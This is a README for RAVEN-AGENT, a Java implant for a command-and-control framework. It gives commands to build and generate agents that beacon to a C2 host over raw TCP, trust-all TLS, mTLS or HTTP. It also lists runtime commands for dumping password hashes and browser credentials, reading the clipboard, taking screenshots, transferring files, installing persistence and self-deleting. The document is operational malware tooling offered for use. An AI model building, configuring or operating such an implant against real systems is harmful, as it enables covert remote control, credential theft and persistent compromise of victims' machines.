# RAVEN-AGENT

Standalone Java implant for the RAVEN C2 framework.

## Connection Modes

| Mode    | Protocol         | Notes                            |
|---------|-----------------|----------------------------------|
| `raw`   | Plain TCP        | No encryption                    |
| `tls`   | TLS socket       | Server cert trust-all            |
| `mtls`  | mTLS socket      | Client cert + CA validation      |
| `fmtls` | Forced mTLS      | Same as mtls                     |
| `multi` | TLS → TCP fallback | Auto-detects server capability |
| `http`  | HTTP beacon      | Poll/submit over HTTP            |
| `https` | HTTPS beacon     | Poll/submit over HTTPS, trust-all|

## Building (standalone, manual config)

Edit constants in `RavenAgent.java`:
- `Host`     — C2 server address
- `Port`     — C2 server port
- `AgentId`  — Unique agent identifier
- `Mode`     — Connection mode (see table above)
- `Persist`  — Reconnect on disconnect
- `SleepMs`  — Beacon interval ms
- `JitterMs` — Jitter range ms

```bash
javac src/main/java/RavenAgent.java -d out/
java -cp out/ RavenAgent
```

## Server-Generated (recommended)

Use the RAVEN server to generate a pre-configured agent:

```bash
java -jar raven.jar -a agent01 -ah 10.0.0.1 -ap 4444 -M raw
java -jar raven.jar -a agent02 -ah 10.0.0.1 -ap 443  -M mtls -ps
java -jar raven.jar -a agent03 -ah 10.0.0.1 -ap 8080 -M http -ps
```

Output goes to `IMPLANT/<AGENT_ID>/`.

## Runtime Commands (raven: protocol)

| Command             | Description                    |
|--------------------|--------------------------------|
| `raven:sleep:5`    | Set check-in interval to 5s   |
| `raven:jitter:500` | Set jitter to 500ms            |
| `raven:sysinfo`    | System information             |
| `raven:screenshot` | Desktop screenshot (base64)    |
| `raven:download:<path>` | Read file (base64)        |
| `raven:upload:<path> <b64>` | Write file          |
| `raven:hashdump`   | Dump password hashes           |
| `raven:browserdump`| Browser credentials            |
| `raven:clipboard`  | Read clipboard                 |
| `raven:persist:<method>` | Install persistence     |
| `raven:unpersist:<method>` | Remove persistence    |
| `raven:spawn`      | Spawn child agent              |
| `raven:selfdestruct` | Terminate + delete self     |
| `raven:reconnect`  | Force reconnect                |
